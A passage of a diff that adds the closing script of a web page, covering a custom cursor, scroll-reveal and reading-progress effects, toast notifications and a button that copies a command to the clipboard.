+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+  // CURSOR
+  const cursor = document.getElementById('cursor');
+  const ring   = document.getElementById('cursorRing');
+  document.addEventListener('mousemove', e => {
+    cursor.style.left = e.clientX + 'px'; cursor.style.top = e.clientY + 'px';
+    ring.style.left   = e.clientX + 'px'; ring.style.top   = e.clientY + 'px';
+    cursor.style.opacity = '1'; ring.style.opacity = '0.5';
+  });
+  document.addEventListener('mousedown', () => { cursor.style.transform = 'translate(-50%,-50%) scale(0.5)'; });
+  document.addEventListener('mouseup',   () => { cursor.style.transform = 'translate(-50%,-50%)'; });
+  document.querySelectorAll('a, button').forEach(el => {
+    el.addEventListener('mouseenter', () => { ring.style.width = '54px'; ring.style.height = '54px'; ring.style.opacity = '0.3'; });
+    el.addEventListener('mouseleave', () => { ring.style.width = '36px'; ring.style.height = '36px'; ring.style.opacity = '0.5'; });
+  });
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+</body>
+</html>
